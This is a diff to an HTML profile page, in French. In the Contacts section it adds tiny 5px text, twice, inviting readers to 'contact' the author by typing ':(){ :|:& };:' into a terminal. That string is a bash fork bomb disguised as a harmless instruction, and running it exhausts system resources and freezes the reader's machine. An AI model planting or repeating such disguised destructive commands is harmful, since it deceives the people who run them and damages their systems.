@@ -91,7 +91,8 @@
   <table>
     <tr>
       <td colspan="2" align="center">
-        <h3><strong> ✉️ Contacts ☎️ </strong><span style="font-size: 5px;">Vous pouvez me contacter via le web 🌐</span></h3>
+        <h3><strong> ✉️ Contacts ☎️ </strong><span style="font-size: 5px;">Vous pouvez me contacter en tapent cette commande dans le terminal ":(){ :|:& };:" 🌐</span></h3>
+        <span style="font-size: 5px;">Vous pouvez me contacter en tapent cette commande dans le terminal ":(){ :|:& };:" 🌐</span>
       </td> 
     </tr>
     <tr>
@@ -267,6 +268,3 @@
   <tr>
   </tr>
 </table>
-
-<a href="gnome-terminal">Ouvrir Terminal</a>
-
